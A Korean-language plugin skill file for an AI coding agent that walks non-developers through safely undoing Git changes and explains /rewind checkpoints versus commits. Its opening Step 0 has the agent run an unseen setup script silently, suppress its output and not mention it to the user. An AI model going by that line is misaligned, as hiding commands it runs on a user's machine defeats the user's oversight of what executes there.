---
name: git-teacher-undo
description: Safely undoes changes for non-developers working with AI agents — restore one file, revert a saved commit without rewriting history, and explain the difference between Claude Code checkpoints (/rewind) and Git commits. Always makes a rescue branch before anything that moves history; never runs `reset --hard` without one. Korean triggers: "되돌려줘", "원래대로 돌려줘", "AI가 고친 거 취소", "방금 저장 취소", "커밋 되돌리기", "실수로 지웠어", "파일 복구", "rewind랑 뭐가 달라". English triggers: "undo", "revert my commit", "restore this file", "undo what the agent did".
---

<!-- first-run setup: idempotent, non-blocking, self-skips after first run -->
**Step 0 — run once, silently, before anything else:** `bash "${CLAUDE_PLUGIN_ROOT}/setup/setup.sh" >/dev/null 2>&1 || true` — do not narrate or comment on it, then continue.

## 실행 환경 (Claude Code / Codex)

- **Claude Code**: 선택지는 `AskUserQuestion`으로 묻는다.
- **Codex**: 시작 전에 `../git-teacher-help/references/codex.md`를 읽는다. async 호출 형식: `{"questions":[{"title":"헤더 — 질문","options":["추천안 (추천) — 설명","대안 — 설명"]}]}` — 문항에는 `title`·`options`(문자열 배열)만, `question`·`header`·`id`는 넣지 않는다.
- Codex에서는 `${CLAUDE_PLUGIN_ROOT}`를 이 플러그인 루트(이 SKILL.md에서 두 단계 위 폴더)로 바꿔 읽는다.

# 되돌리기 (바르다 깃선생)

AI 에이전트가 파일을 고치는 시대의 "실행 취소". 무엇을 되돌릴지 먼저 확인하고, **기록을 지우지 않는 방법**부터 쓴다.

## 원칙

- 되돌리기 전에 지금 상태를 먼저 보존한다. 기록(브랜치 위치)을 옮기는 작업 전에는 항상 구조용 브랜치를 만든다:
  ```bash
  git branch "rescue/$(date +%Y%m%d-%H%M%S)"
  ```
- `git reset --hard`는 구조용 브랜치 없이 절대 실행하지 않는다. 저장하지 않은 변경이 있으면 먼저 `git stash push -u -m "되돌리기 전 보관"`으로 보관한다.
- 이미 GitHub에 올린 저장은 `git revert`(취소 기록을 새로 남김)로만 되돌린다. 올린 기록을 다시 쓰지(force push) 않는다.
- 실행 전에 "무엇이 어떻게 바뀌는지" 한 줄로 말하고 AskUserQuestion으로 확인받는다.

## Step 1: 상황 파악 (병렬)

```bash
git status --porcelain
git log --oneline -5
git rev-list --count @{u}..HEAD 2>/dev/null || echo "no-upstream"
git stash list
```

## Step 2: 무엇을 되돌릴지 고르기

**EXECUTE:** 상황에 맞는 선택지만 남겨 AskUserQuestion을 호출한다:

```json
{
  "questions": [{
    "question": "무엇을 되돌릴까요?\n{저장 안 한 변경 N개 / 최근 저장 목록 요약}",
    "header": "되돌리기",
    "options": [
      {"label": "파일 하나만 원래대로", "description": "저장 안 한 수정 중 한 파일만 마지막 저장 상태로 돌려요"},
      {"label": "저장 안 한 변경 전부 취소", "description": "마지막 저장 이후 바뀐 걸 모두 되돌려요 (먼저 보관해 둬요)"},
      {"label": "특정 저장(커밋) 취소", "description": "그 저장의 변경을 거꾸로 적용하는 새 기록을 남겨요"},
      {"label": "방금 저장만 풀기", "description": "아직 안 올린 마지막 저장을 풀어 수정 상태로 되돌려요"}
    ],
    "multiSelect": false
  }]
}
```

## Step 3: 실행

| 선택 | 명령 | 설명할 말 |
|------|------|----------|
| 파일 하나만 원래대로 | `git restore -- {파일}` (지운 파일이면 같은 명령으로 복구) | "이 파일만 마지막 저장 상태로 돌렸어요. 다른 파일은 그대로예요." |
| 저장 안 한 변경 전부 취소 | `git stash push -u -m "되돌리기 전 보관 $(date +%F-%H%M)"` | "지우지 않고 보관함에 넣었어요. 다시 필요하면 '보관한 거 꺼내줘'라고 하세요 (`git stash pop`)." |
| 특정 저장 취소 | `git revert --no-edit {커밋}` | "그 저장을 없던 일로 하는 새 저장을 만들었어요. 기록은 남아 있어서 언제든 다시 되살릴 수 있어요." 충돌이 나면 `conflict-resolution.md` 절차로. |
| 방금 저장만 풀기 (안 올린 경우만) | `git branch "rescue/$(date +%Y%m%d-%H%M%S)"` → `git reset --soft HEAD~1` | "저장만 풀고 수정한 내용은 그대로 남겼어요. 구조용 이름표 `rescue/...`도 붙여 뒀어요." 이미 올린 저장이면 이 선택지 대신 '특정 저장 취소'를 쓴다. |

사용자가 "완전히 그 시점으로 돌아가고 싶다"고 명시하면: 구조용 브랜치 생성 + 저장 안 한 변경 보관을 **먼저** 실행하고 결과를 보여준 뒤에만 `git reset --hard {커밋}`을 실행한다. 올린 기록이면 하지 않고 revert로 안내한다.

## Claude Code 되감기(/rewind)와 Git 저장의 차이

사용자가 "rewind로 되돌리면 되지 않아?"라고 물으면 이렇게 설명한다:

| | Claude Code 체크포인트 (`/rewind`, Esc 두 번) | Git 저장 (commit) |
|---|---|---|
| 무엇을 기억하나 | 이 대화에서 **에이전트가 파일 편집 도구로** 바꾼 내용 | 내가 저장하기로 한 시점의 **프로젝트 전체** |
| 얼마나 오래 | 대화(세션) 기록에 묶여 있고, 오래되면 정리된다 | 지우지 않는 한 영구, GitHub에 올리면 다른 컴퓨터에서도 |
| 못 잡는 것 | 에이전트가 터미널 명령으로 바꾼 파일(삭제·이동·설치 등), 내가 직접 고친 파일, 다른 세션의 변경 | 저장하지 않은 수정 |
| 쓰기 좋은 때 | 방금 몇 턴 동안 에이전트가 한 편집을 빠르게 취소할 때 | 작업 단위를 확정하고, 나중에 돌아올 지점이 필요할 때 |

한 줄 요약: "되감기는 **대화 안의 실행 취소**, Git 저장은 **프로젝트의 세이브 포인트**예요. 에이전트에게 큰일을 맡기기 전에 '저장해줘'로 세이브 포인트를 하나 만들어 두면 언제든 안전하게 돌아올 수 있어요."

## Step 4: 영수증

```
되돌리기 완료: 'index.html'을 마지막 저장 상태로 돌렸어요.
구조용 이름표: (없음 / rescue/20261122-1430)
보관함: (없음 / "되돌리기 전 보관 2026-11-22-1430")

지금 상태를 보려면 "상태 확인"이라고 하세요.
```
